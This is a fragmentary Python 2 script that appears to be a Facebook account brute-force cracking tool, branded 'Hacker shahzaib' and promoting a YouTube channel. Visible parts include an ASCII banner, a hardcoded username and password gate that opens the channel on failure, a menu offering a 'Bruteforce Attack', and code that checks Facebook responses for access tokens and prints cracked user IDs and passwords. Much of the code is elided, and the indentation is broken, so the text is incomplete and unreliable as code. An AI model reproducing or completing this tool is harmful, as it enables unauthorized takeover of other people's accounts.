...
╚══════╝╚═╝░░╚═╝╚═════╝░╚═╝
••••••░░░░░░░░░░░░░░░░••••••
\033[0;94m  ~  ᶜʳeaᵗeᵈ ᴮʸ  ✪ Shahzaib
\033[0;94m  ~  ʸouᵗuᵇe ✪ NSK tech~
\033[0;97m  ~  User Satisfaction is my top priority.....~
••••••░░░░░░░░░░░░░░░░•••••• """                                         
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
...
CorrectUsername = "Shahzaib"
CorrectPassword = "zabi"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;97m📋 \x1b[1;95mENTER USERNAME :\x1b[1;97m»» \x1b[1;97m")
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            print "\033[1;96mYou have entered wrong PASSWORD"
            os.system('xdg-open https://www.youtube.com/channel/UC_ONiEAeNFSbhofqpkxKTBw')
    else:
        print "\033[1;96mYou have entered wrong USERNAME"
        os.system('xdg-open https://www.youtube.com/channel/UC_ONiEAeNFSbhofqpkxKTBw')
...
def login():
	...
	try:
		...
		print logo
		print 42*"\033[1;96m="
		print('\033[1;96m[¤] \x1b[1;93mLogin With your new account \x1b[1;93m[¤]' )
...
def menu():
	...
	print "\033[1;32;40m[2] \033[1;33;42mHacker shahzaib"																														
...
def super():
	...
	print "\x1b[1;32;40m[type3] \033[1;33;43mBruteforce Attack"
...
def pilih_super():
	...
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93m \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
	print
				...
				if 'www.facebook.com' in q["error_msg"]:
					...
					if 'access_token' in q:
						...
						if 'www.facebook.com' in q["error_msg"]:
							...
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92m[DONE] \x1b[1;92m ' + user  + ' \x1b[1;92m | \x1b[1;92m ' + pass3 + ' ⚡ ' + b['name']
